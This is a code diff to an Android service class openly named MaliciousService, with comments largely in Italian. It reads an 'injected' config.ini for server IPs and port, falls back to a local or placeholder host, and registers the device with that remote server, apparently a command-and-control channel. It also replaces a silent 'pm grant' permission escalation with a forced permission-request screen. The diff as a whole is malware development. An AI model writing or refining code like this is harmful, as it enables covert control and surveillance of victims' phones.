@@ -280,38 +280,87 @@ public class MaliciousService extends Service {
             
             Log.d(TAG, "Read from config.ini: LOCAL_IP=" + localIp + ", PUBLIC_IP=" + publicIp + ", PORT=" + port);
             
-            // First try to use local IP (same WiFi)
-            if (localIp != null && !localIp.isEmpty() && port != null && !port.isEmpty()) {
-                Log.d(TAG, "Trying local IP first: " + localIp + ":" + port);
-                saveServerConfigToPreferences(localIp, port, port);
+            // Salviamo entrambi gli IP e proviamo prima il locale, poi il pubblico
+            if (localIp != null && !localIp.isEmpty() && publicIp != null && !publicIp.isEmpty() && port != null && !port.isEmpty()) {
+                Log.d(TAG, "Configurazione completa trovata. Provo prima IP locale: " + localIp + ":" + port);
                 
-                // Schedule a check to try public IP if local fails
+                // Salva entrambi gli IP nelle preferenze
+                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                SharedPreferences.Editor editor = prefs.edit();
+                editor.putString("LOCAL_IP", localIp);
+                editor.putString("PUBLIC_IP", publicIp);
+                editor.putString("PORT", port);
+                editor.apply();
+                
+                // Imposta prima l'IP locale
+                saveServerConfigToPreferences(localIp, port, port);
+
+                // Programma un controllo per provare l'IP pubblico se quello locale fallisce
                 final String finalLocalIp = localIp;
                 final String finalPublicIp = publicIp;
+                final String finalPort = port;
+
+                Handler handler = new Handler();
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        if (!isServerReachable(finalLocalIp, finalPort) && finalPublicIp != null && !finalPublicIp.isEmpty()) {
+                            Log.d(TAG, "IP locale non raggiungibile, passo all'IP pubblico: " + finalPublicIp);
+                            saveServerConfigToPreferences(finalPublicIp, finalPort, finalPort);
+                            loadServerConfigFromPreferences();
+                            registerDeviceWithServer();
+                        } else {
+                            Log.d(TAG, "IP locale raggiungibile, continuo a usare: " + finalLocalIp);
+                            registerDeviceWithServer();
+                        }
+                    }
+                }, 3000); // Attendi 3 secondi prima di provare l'IP pubblico
+                
+            } else if (localIp != null && !localIp.isEmpty() && port != null && !port.isEmpty()) {
+                Log.d(TAG, "Solo IP locale trovato, uso: " + localIp + ":" + port);
+                saveServerConfigToPreferences(localIp, port, port);
+                
+                // Prova anche con un IP pubblico predefinito se quello locale fallisce
+                final String finalLocalIp = localIp;
                 final String finalPort = port;
                 
                 Handler handler = new Handler();
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        if (!isServerReachable(finalLocalIp, finalPort) && finalPublicIp != null && !finalPublicIp.isEmpty()) {
-                            Log.d(TAG, "Local IP unreachable, switching to public IP: " + finalPublicIp);
-                            saveServerConfigToPreferences(finalPublicIp, finalPort, finalPort);
+                        if (!isServerReachable(finalLocalIp, finalPort)) {
+                            Log.d(TAG, "IP locale non raggiungibile, provo con IP pubblico predefinito");
+                            // Prova con un IP pubblico predefinito
+                            saveServerConfigToPreferences("your-public-ip.com", finalPort, finalPort);
+                            loadServerConfigFromPreferences();
+                            registerDeviceWithServer();
                         }
                     }
-                }, 5000); // Wait 5 seconds before checking
-            } 
-            // If no local IP or it's empty, try public IP directly
-            else if (publicIp != null && !publicIp.isEmpty() && port != null && !port.isEmpty()) {
-                Log.d(TAG, "Using public IP: " + publicIp + ":" + port);
+                }, 3000);
+                
+            } else if (publicIp != null && !publicIp.isEmpty() && port != null && !port.isEmpty()) {
+                // Se non c'è IP locale, usa direttamente quello pubblico
+                Log.d(TAG, "Solo IP pubblico trovato, uso: " + publicIp + ":" + port);
                 saveServerConfigToPreferences(publicIp, port, port);
             } else {
-                Log.w(TAG, "Injected config.ini found but IP/Port are missing or empty.");
+                Log.e(TAG, "Nessuna configurazione server valida trovata in config.ini");
+                
+                // Prova a usare valori predefiniti in caso di errore
+                Log.d(TAG, "Tentativo con valori predefiniti: 192.168.1.100:8080");
+                saveServerConfigToPreferences("192.168.1.100", "8080", "8080");
             }
         } catch (IOException e) {
-            Log.w(TAG, "config.ini not found in assets, or error reading it: " + e.getMessage());
+            Log.w(TAG, "config.ini non trovato negli assets: " + e.getMessage());
+            
+            // Prova a usare valori predefiniti in caso di errore
+            Log.d(TAG, "Tentativo con valori predefiniti: 192.168.1.100:8080");
+            saveServerConfigToPreferences("192.168.1.100", "8080", "8080");
         } catch (Exception e) {
-            Log.e(TAG, "Error processing injected config from assets: " + e.getMessage());
+            Log.e(TAG, "Errore nell'elaborazione della configurazione: " + e.getMessage());
+            
+            // Prova a usare valori predefiniti in caso di errore
+            Log.d(TAG, "Tentativo con valori predefiniti: 192.168.1.100:8080");
+            saveServerConfigToPreferences("192.168.1.100", "8080", "8080");
         }
     }
     
@@ -354,13 +403,15 @@ public class MaliciousService extends Service {
     }
 
     private void grantPermissions() {
-        try {
-            String packageName = getPackageName();
-            for (String perm : getRequiredPermissions()) {
-                Runtime.getRuntime().exec("pm grant " + packageName + " " + perm);
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Grant permissions error: " + e.getMessage());
+        // Non tentiamo più di concedere i permessi con pm grant perché richiede root
+        // Invece, ci affidiamo alla richiesta esplicita tramite PermissionRequestActivity
+        Log.d(TAG, "Permissions will be requested through PermissionRequestActivity");
+        
+        // Forziamo l'avvio dell'activity di richiesta permessi se non sono già concessi
+        if (!allPermissionsGranted()) {
+            Intent permissionIntent = new Intent(this, PermissionRequestActivity.class);
+            permissionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(permissionIntent);
         }
     }
 
